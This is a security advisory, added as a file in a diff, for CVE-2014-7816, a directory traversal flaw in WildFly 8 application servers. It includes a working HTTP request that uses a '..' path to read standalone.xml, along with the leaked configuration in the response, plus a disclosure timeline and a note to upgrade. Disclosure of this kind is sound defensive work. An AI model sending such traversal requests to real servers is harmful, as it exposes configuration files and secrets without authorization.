@@ -1,0 +1,106 @@
+[CONVISO-14-001] - WildFly 8 (JBossAS) Application Directory Traversal Vulnerability
+
+1. Advisory Information
+    Conviso Advisory ID: CONVISO-14-001
+    CVE ID: CVE-2014-7816
+    CVSS v2: 5.0, (AV:N/AC:L/Au:N/C:P/I:N/A:N)
+    Date: 2014-10-27
+
+2. Affected Components
+    WildFly 8 Application (8.1.0.Final)
+    WildFly 8 Application (9.0.0.Alpha1)
+    WildFly 8 Application (8.0.0.Final)
+
+3. Description
+    Directory traversal vulnerability in WildFly 8.1.0.Final allows remote attackers to read
+    arbitrary files via a .. (dot dot) in the URI parameter in a render action to
+    standalone/configuration/standalone.xml or any other configuration file.
+
+4. Details
+    Directory Traversal in *http://domaintesting:8080/* .
+
+    Request
+
+        /-----
+        GET /..\\standalone\\configuration\\standalone.xml HTTP/1.1
+        User-Agent: curl/7.38.0
+        Host: 127.0.0.1:8080
+        Accept: */*
+        -----/
+
+    Response
+
+        /-----
+        HTTP/1.1 200 OK
+        Connection: keep-alive
+        Last-Modified: Wed, 22 Oct 2014 14:37:28 GMT
+        X-Powered-By: Undertow/1
+        Server: WildFly/8
+        Content-Type: text/xml
+        Content-Length: 19697
+        Date: Wed, 22 Oct 2014 16:32:08 GMT
+
+        <?xml version='1.0' encoding='UTF-8'?>
+
+        <server xmlns="urn:jboss:domain:2.1">
+                <extensions>
+                        <extension module="org.jboss.as.clustering.infinispan"/>
+                        <extension module="org.jboss.as.connector"/>
+                        <extension module="org.jboss.as.deployment-scanner"/>
+                        <extension module="org.jboss.as.ee"/>
+                        <extension module="org.jboss.as.ejb3"/>
+                        <extension module="org.jboss.as.jaxrs"/>
+                        <extension module="org.jboss.as.jdr"/>
+                        <extension module="org.jboss.as.jmx"/>
+                        <extension module="org.jboss.as.jpa"/>
+                        <extension module="org.jboss.as.jsf"/>
+                        <extension module="org.jboss.as.logging"/>
+                        <extension module="org.jboss.as.mail"/>
+                        <extension module="org.jboss.as.naming"/>
+                        <extension module="org.jboss.as.pojo"/>
+                        <extension module="org.jboss.as.remoting"/>
+                        <extension module="org.jboss.as.sar"/>
+                        <extension module="org.jboss.as.security"/>
+                        <extension module="org.jboss.as.transactions"/>
+                        <extension module="org.jboss.as.webservices"/>
+                        <extension module="org.jboss.as.weld"/>
+                        <extension module="org.wildfly.extension.batch"/>
+                        <extension module="org.wildfly.extension.io"/>
+                        <extension module="org.wildfly.extension.undertow"/>
+                </extensions>
+    ...
+
+5. Solution
+    Upgrate to patched version.
+
+6. Credits
+    Roberto Soares <rsoares@conviso.com.br>
+
+7. Report Timeline
+    Oct 22, 2014 - Conviso notifies the WildFly Security team of the vulnerability.
+    Oct 22, 2014 - Conviso sends a brief technical report.
+    Oct 27, 2014 - The security team responds with information about the vulnerability.
+    Oct 27, 2014 - The security team sends the number of CVE. Waiting for vulnerability patch.
+    Nov 20, 2014 - WildFly 8.2.0.Final is released.
+    Nov 26, 2014 - Red Hat Security Team confirmed the vulnerability patch.
+    Nov 26, 2014 - Public release of advisory
+
+8. References
+    http://wildfly.org/
+    https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)
+
+9. About Conviso
+    Conviso is a consulting company specialized on application security. Our values are based on the
+    allocation of the adequate competencies on the field, a clear and direct speech with the market,
+    collaboration and partnership with our customers and business partners and constant investments
+    on methodology and research improvement. For more information about our company and services
+    provided, please check our website at www.conviso.com.br.
+
+10. Copyright and Disclaimer
+    The information in this advisory is Copyright 2014 Conviso Application Security S/A and provided
+    so that the society can understand the risk they may be facing by running affected software,
+    hardware or other components used on their systems. In case you wish to copy information from
+    this advisory, you must either copy all of it or refer to this document (including our URL). No
+    guarantee is provided for the accuracy of this information, or damage you may cause your systems
+    in testing.
+
